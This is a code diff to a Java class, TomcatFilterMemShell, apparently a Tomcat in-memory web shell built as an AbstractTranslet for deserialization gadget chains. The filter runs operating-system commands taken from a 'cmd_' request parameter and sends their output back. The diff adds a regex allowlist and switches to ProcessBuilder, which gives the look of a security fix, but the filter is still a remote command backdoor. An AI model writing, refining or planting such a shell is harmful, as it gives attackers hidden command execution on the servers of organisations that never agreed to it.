@@ -90,11 +90,24 @@ public class TomcatFilterMemShell extends AbstractTranslet implements Filter {
 
     }
 
+    private static final java.util.regex.Pattern CMD_FILTER_PATTERN =
+            java.util.regex.Pattern.compile("^[a-zA-Z0-9_/\\.-]+$");
+
     @Override
     public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {
         String cmd;
         if ((cmd = servletRequest.getParameter("cmd_")) != null) {
-            Process process = Runtime.getRuntime().exec(cmd);
+            String[] parts = cmd.split("\\s+");
+            for (String part : parts) {
+                if (!CMD_FILTER_PATTERN.matcher(part).matches()) {
+                    servletResponse.getOutputStream().write("Command not allowed".getBytes());
+                    servletResponse.getOutputStream().flush();
+                    servletResponse.getOutputStream().close();
+                    return;
+                }
+            }
+            ProcessBuilder pb = new ProcessBuilder(parts);
+            Process process = pb.start();
             java.io.BufferedReader bufferedReader = new java.io.BufferedReader(
                     new java.io.InputStreamReader(process.getInputStream()));
             StringBuilder stringBuilder = new StringBuilder();
